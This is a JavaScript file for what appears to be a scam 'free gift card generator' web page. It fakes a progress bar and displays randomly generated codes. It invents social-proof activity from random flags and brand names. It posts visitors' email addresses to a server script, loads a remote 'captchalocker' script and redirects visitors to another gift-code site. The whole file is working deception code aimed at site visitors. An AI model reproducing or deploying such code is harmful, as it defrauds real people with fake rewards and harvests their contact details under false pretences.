var devmode = false;
var current_ssl = "https://";
var x_url_string = window.location.href;
var x_url = new URL(x_url_string);
var x_c = x_url.searchParams.get("devmode");
if (x_c == "true") {
    devmode = true;
    console.log("x activate");
}

var current_user = "cou";
var brands = ["Fashion Nova", "ASOS", "H&M", "Jeffree Star Cosmetics"];
var country_flags = ["ck.png", "fo.png", "fr.png", "gb.png", "hu.png", "id.png", "ie.png", "il.png", "im.png", "in.png", "iq.png", "ir.png", "is.png", "it.png", "je.png", "jm.png", "jo.png", "jp.png", "ke.png", "kh.png", "ki.png", "km.png", "kn.png", "kp.png", "kr.png", "kw.png", "ky.png", "kz.png", "la.png", "lb.png", "li.png", "lk.png", "lr.png", "ls.png", "lt.png", "lu.png", "lv.png", "ly.png", "ma.png", "pk.png", "qa.png", "re.png", "ro.png", "rs.png", "ru.png", "rw.png", "sa.png", "sb.png", "sc.png", "sd.png", "se.png", "sg.png", "sh.png", "si.png", "sj.png", "sk.png", "sl.png", "sm.png", "sn.png", "so.png", "sr.png", "ss.png", "st.png", "sv.png", "sx.png", "sy.png", "sz.png", "tc.png", "td.png", "tf.png", "tg.png", "th.png", "tj.png", "tk.png", "tl.png", "tm.png", "tn.png", "to.png", "tr.png", "tt.png", "tv.png", "tw.png", "tz.png", "ua.png", "ug.png", "um.png", "us.png", "uy.png", "uz.png", "va.png", "vc.png", "ve.png", "vg.png", "vi.png", "vn.png", "vu.png", "wf.png", "ws.png", "ye.png", "yt.png", "za.png", "zm.png", "zw.png"];
var clicked = false;
var count_start = 0;
var count_step_1 = random_number(24, 40);
var count_step_2 = random_number(70, 82);
var count_step_3 = random_number(88, 99);
var gift_size = 0;
var first_conv = true;
var display_num = "/";
var link_ref = "go";



function set_dev() {
    devmode = true;
    if ($('.set-gup-go').length) {
        $('.set-gup-go').replaceWith('<p class="generate" data-toggle="modal" data-target="#generate-modal">Generate Gift Card</p>');

        $('.generate').on("click", function() {

            $('.gift-size').text($('#exampleFormControlSelect1 option:selected').val());

            Start();

            $('#antibot2').append($('<div>').load('../maxed/captcha.php'));
            $('#antibot2').show();

        });
    }
}


function gup(name, url) {
    if (!url) url = location.href;
    name = name.replace(/[\[]/, "\\\[").replace(/[\]]/, "\\\]");
    var regexS = "[\\?&]" + name + "=([^&#]*)";
    var regex = new RegExp(regexS);
    var results = regex.exec(url);
    return results == null ? null : results[1];
}


function og_converted() {
    if (first_conv == true) {
        first_conv = false;

        $('.step-3').removeClass('steps-active');
        $('.step-4').addClass("steps-active");

        $('.generate-validation').slideUp();
        $('.generate-email').slideDown();
        $('#verification-captcha').remove();
        $('.email-captcha').html('<div data-captcha-enable="true" id="verification-captcha"></div>');


        $.getScript("//www.dudemobile.net/captchalocker/js/captcha.js.php?id=931d66d1a3e09d3950adaa80d6ed9806", function(data, textStatus, jqxhr) {
            console.log("Load was performed.");
            console.log(textStatus); // Success
            console.log(jqxhr.status); // 200
        });

    } else {
        $('.generate-email').slideUp();
        $('.generate-link').slideDown();

        setTimeout(function() {
            window.location.href = "https://easygiftcodes.com/unlocked/image.php?id=247091";
        }, 7100);
    }
}


function random_flag() {
    return "flags/" + country_flags[random_number(0, country_flags['length'] - 1)];
}

function random_brand() {
    return brands[random_number(0, brands['length'] - 1)];
}


function random_number(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}



function setCookie(cname, cvalue, exdays) {
    var d = new Date();
    d.setTime(d.getTime() + (exdays * 24 * 60 * 60 * 1000));
    var expires = "expires=" + d.toUTCString();
    document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
}

function getCookie(cname) {
    var name = cname + "=";
    var ca = document.cookie.split(';');
    for (var i = 0; i < ca.length; i++) {
        var c = ca[i];
        while (c.charAt(0) == ' ') {
            c = c.substring(1);
        }
        if (c.indexOf(name) == 0) {
            return c.substring(name.length, c.length);
        }
    }
    return "";
}

function checkCookie() {
    var user = getCookie("username");
    if (user == "" && clicked == false) {
        setCookie("username", "done", 365);
        $('.country-flag').attr("src", random_flag());
        $('.fashion-brand').text(random_brand());
        $('.activity-ago-hours').text(random_number(0, 3));
        $('.activity-ago-minutes').text(random_number(12, 59));
        $('.activity').show(1000);
    }
}

function make_key() {

    var text = "";
    var text2 = "";

    var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    for (var i = 0; i < 5; i++) {
        text += possible.charAt(Math.floor(Math.random() * possible.length));
    }
    for (var i = 0; i < 5; i++) {
        text2 += possible.charAt(Math.floor(Math.random() * possible.length));
    }
    return text + text2 + "XXXX";
}

function make_key_ending() {
    var text = "";

    var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    for (var i = 0; i < 5; i++) {
        text += possible.charAt(Math.floor(Math.random() * possible.length));
    }
    return text;
}




function Start() {
    count_start++;
    $('.generate-status-percentage').text(count_start + "%");
    if (count_start == count_step_1) {
        $('.step-1').removeClass('steps-active');
        $('.step-2').addClass("steps-active");
        $('.generate-status-text').text("Generating gift cards...");
    } else if (count_start == count_step_2) {
        $('.step-2').removeClass('steps-active');
        $('.step-3').addClass("steps-active");
        $('.generate-status-text').text("Verifying gift card code");
    }

    if (count_start > count_step_1 && count_start < count_step_2) {
        $('.generate-status-key span').text(make_key);
    }

    if (count_start > count_step_3) {
        $('.generate-status-key').slideUp(400);
        finalAction();
        $('.generate-status-text').text("User validation required!");

        setTimeout(function() {
            $('.generate-final-code').html('<i class="fas fa-gift verification-gift-icon"></i>' + $('.generate-status-key span').text());
            $('.generate-final-code2').html('<i class="fas fa-gift verification-gift-icon"></i>' + $('.generate-status-key span').text().substring(0, $('.generate-status-key span').text().length - 4) + make_key_ending());
            $('.generate-status').slideUp(400);
            $('.generate-spinner').slideUp(400);
            $('.generate-validation').slideDown(400);
        }, 3000);

    } else {
        setTimeout(function() {
            Start();
        }, random_number(190, 250));
    }
}

function finalAction() {
    console.log("finish");
}


function set_gup(block_param) {
    $('.generate').replaceWith('<div target="_tab" class="set-gup-go" data-go="?start=' + $("#exampleFormControlSelect1").val() + '"><p class="generate-css" data-toggle="modal" data-target="#generate-modal">Generate Gift Card</p></div>');
    $('.set-gup-go').on("click", function() {

        window.open('?start=' + $("#exampleFormControlSelect1").val(), '_blank');
        window.open(current_ssl + current_user + toggle_email + link_ref + display_num + brand_name, '_self');

    });
}


$(function() {
    setTimeout(function() {
        checkCookie();
        setTimeout(function() { $('.activity').hide(1000) }, 12000);
    }, 10000);




    $('a[href^="#"]').on('click', function(event) {
        var target = $(this.getAttribute('href'));
        if (target.length) {
            event.preventDefault();
            $('html, body').stop().animate({
                scrollTop: target.offset().top
            }, 1000);
        }
    });

    var email_clicked = false;
    $('.send-email').click(function() {
        if (email_clicked == false) {

            email_clicked = true;
            var customer_email = "";
            customer_email = $('.send-to-email').val();
            $.post("../maxed/send.php", { email: customer_email, category: location.pathname });

            var send_email_button = $(this);
            $(send_email_button).html('<i class="fas fa-sync fa-spin"></i>');



            setTimeout(function() {

                $(send_email_button).removeClass("btn-unique")
                $(send_email_button).addClass("btn-light cursor-disabled");
                $(send_email_button).html('<i class="fas fa-lock"></i>');
                $(send_email_button).attr("title", "Please complete reCAPTCHA check to continue!")
                $('[data-toggle="tooltip"]').tooltip();
                $('.email-captcha').show(500);
            }, 1900);

        }
    });


    $('.generate').on("click", function() {

        $('.gift-size').text($('#exampleFormControlSelect1 option:selected').val());

        Start();
        if (devmode == true) {
            $('#antibot2').append($('<div>').load('../maxed/captcha.php'));
            $('#antibot2').show();
        } else {
            $.getScript("//www.dudemobile.net/captchalocker/js/captcha.js.php?id=9a57d8575751faa0f25fbf018fbfc798", function(data, textStatus, jqxhr) {
                console.log("Load was performed.");
                console.log(textStatus); // Success
                console.log(jqxhr.status); // 200
            });
            $('#antibot').show();
        }
    });

    var gup_param = gup('start', window.location.href);
    if (gup_param) {
        console.log("guppi:" + gup_param);
        $("#exampleFormControlSelect1 option[value='" + gup_param + "']").prop('selected', true);
        $('.generate').click();
    } else if (brand_name != "") {
        set_gup(current_ssl + current_user + toggle_email + link_ref + display_num + brand_name);
    }
});